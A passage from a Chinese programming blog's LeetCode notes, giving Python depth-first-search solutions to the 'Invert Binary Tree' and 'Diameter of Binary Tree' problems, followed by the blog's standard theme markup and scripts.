<h2 id="2-DFS类问题"><a href="#2-DFS类问题" class="headerlink" title="2. DFS类问题"></a>2. DFS类问题</h2><h3 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226. 翻转二叉树"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/invert-binary-tree/">226. 翻转二叉树</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [4,2,7,1,3,6,9]</span></span><br><span class="line"><span class="comment"># 输出：[4,7,2,9,6,3,1]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invertTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">Optional</span>[TreeNode]:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            root.left, root.right = root.right, root.left</span><br><span class="line">            dfs(root.left)</span><br><span class="line">            dfs(root.right)</span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>



<h3 id="543-二叉树的直径"><a href="#543-二叉树的直径" class="headerlink" title="543. 二叉树的直径"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/diameter-of-binary-tree/">543. 二叉树的直径</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [1,2,3,4,5]</span></span><br><span class="line"><span class="comment"># 输出：3</span></span><br><span class="line"><span class="comment"># 解释：3 ，取路径 [4,2,1,3] 或 [5,2,1,3] 的长度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">diameterOfBinaryTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        self.d = <span class="number">0</span>  <span class="comment"># 记录最终结果</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            left = dfs(root.left)</span><br><span class="line">            right = dfs(root.right)</span><br><span class="line">            self.d = <span class="built_in">max</span>(self.d, left + right)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(left, right) + <span class="number">1</span>   <span class="comment"># 要维护的是当前结点的最长子路径，回撤操作+1</span></span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> self.d</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/" rel="tag">Leetcode算法笔记</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
  </article>
  

  
  <nav class="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2015-2024
        <i class="ri-heart-fill heart_icon"></i> Ser.Archer
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="SerArcher&#39;s Blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>